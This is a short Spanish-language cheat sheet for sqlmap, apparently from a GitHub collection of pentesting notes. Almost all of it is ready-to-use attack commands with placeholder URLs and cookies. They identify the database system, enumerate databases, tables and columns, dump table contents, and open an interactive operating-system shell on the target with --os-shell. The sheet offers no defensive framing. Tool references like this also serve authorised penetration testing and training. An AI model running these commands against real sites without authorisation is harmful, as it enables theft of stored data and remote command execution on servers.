# SQLMap Cheat Sheet

#### Uso simple
```
sqlmap -u "<URL>"
```

#### Especificar el Sistema Gestor de Base de Datos
```
sqlmap -u "<URL>" --dbms=<Name-DBMS>
```

#### Listar las Bases de Datos del sitio
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs
```

#### Listar las tablas de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> --tables
```

#### Ver todo el contenido de una Tabla de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump
```

#### Listar las columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --columns
```

#### Ver contenido de ciertas Columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> -C <Column1,Column2> --dump
```

#### Obtener un Shell de OS interactivo
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --os-shell
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)